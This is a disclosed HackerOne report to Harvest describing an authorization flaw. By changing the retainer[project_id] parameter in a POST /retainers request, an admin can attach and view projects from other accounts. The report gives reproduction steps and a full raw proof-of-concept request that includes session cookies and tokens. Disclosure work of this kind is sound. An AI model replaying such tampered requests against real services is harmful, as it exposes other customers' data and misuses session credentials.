@@ -1,0 +1,40 @@
+ReportLink:https://hackerone.com/reports/152929
+WeaknessName:Improper Authentication - Generic
+Reporter:https://hackerone.com/imbecile
+ReportedTo:Harvest(harvest)
+BountyAmount:500.0
+Severity:
+State:Closed
+DateOfDisclosure:01.11.2016 23:18:18
+
+Summary:
+
+Hello,
+
+The POST request to create new Retainer in admin panel can use and disclose all the projects in @harvest not just available in admin's @harvest instance.
+
+__Steps to Reproduce:__
+1. Login to application using admin credentials and traverse to Invoices > Retainers > + New Retainers
+2. Select valid Client and Project and click on Create Retainer
+3. Intercept the request and change the ```retainer[project_id]``` POST parameter value to any other project ID (Example: 11310690)
+4. Observe the mapped project in resulting page (which is not of the user's) 
+
+__Request:__
+```
+POST /retainers HTTP/1.1
+Host: kalki.harvestapp.com
+Connection: close
+Content-Length: 200
+Cache-Control: max-age=0
+Origin: https://kalki.harvestapp.com
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.106 Safari/537.36
+Content-Type: application/x-www-form-urlencoded
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Referer: https://kalki.harvestapp.com/retainers
+Accept-Encoding: gzip, deflate, br
+Accept-Language: en-US,en;q=0.8
+Cookie: __utma=; __utmb=; __utmc=; __utmx=; __utmz=; __utmv=; __utmk=; removed_from_remarketing=true; production_access_token=c25JenRIcEJ4MHdOL08wa1VaL0paTURlcUdqZjZpUnlxZHVaYUJxSDZSektHYlVkOXlYS3JBMG5FQjVsbWJKSHpBOW1Cd3dBWjNsQkRITDlwNUlFVXlZTG1PM3IwS20xZjRCTnlhMFIvZktwdWhXU0l1QnZUWkJDUnRJUmRJZjJHVlRoakRrK2J2QmkxUmUvekN5U253PT0tLW5zUTV4Z3JpNkhCeGdMczk3WnUrNVE9PQ%3D%3D--c6f2aa80cba2531fb74f3c964ebb98f94284dacd; tab=projects; _gat_UA-103886-9=1; _harvest_sess=VE1ENjJJdWJNMTFaQ05XRU5VeS9odFdjYlNvekpkNU9SSWo2OGNKaXVPempNOTd5Vk1jYVo5ZC9Fa1RydzRxVHJTTXV4ejFUeHpMSG5VVXBiQTl6ZG5Qb2kwUXc1QXpmUU5OMjlhVk9zdndOTVFxd01PSWJXeHJLR3RhbmFtQzVwOEdtUXQ1djNWaytZYS83Q2xKZDA2MC9GQ3ZJbGwwMVluTHp5WWRzTWZISC9KelRSTnpsNUViRXliMThFYU5ldFJkY2w5TjhBMmZodVIxblU4TjdIR3NDK3Q5RXNzRUtjb1FvU0RKeDlTTTQxN1RiN3BVLy9RVGF5SUxrTzUvYlVXWjRaZy9zMmhnTVEzY0djQjF3R0x1K0o5ZlF1SURISjRCN0NiMmVwYXRyem43UHVpRG1adnl6aFo4cXZNU1BnZk1NS28yc0ppeDJ4ZHpyZDF3MkVnPT0tLWl3cExZMTY5QTI2R2sramlUSkZsbmc9PQ%3D%3D--fdf23974636360066904b23490cee4aaa8af998a; __utma=; __utmb=; __utmc=; __utmx=; __utmz=; __utmv=; __utmk=; _ga=GA1.3.248343812.1469015568
+
+utf8=%E2%9C%93&authenticity_token=2sMNTZOgzHB08ikQe5W%2FQVIJlH%2Bhr5tUKNJtLELNQ%2FCMteRK%2FmAU8MGBORxzjWJPUbaovG0yVqAqZ5KFi0uVWg%3D%3D&retainer%5Bclient_id%5D=4679616&retainer%5Bproject_id%5D=11310690
+```
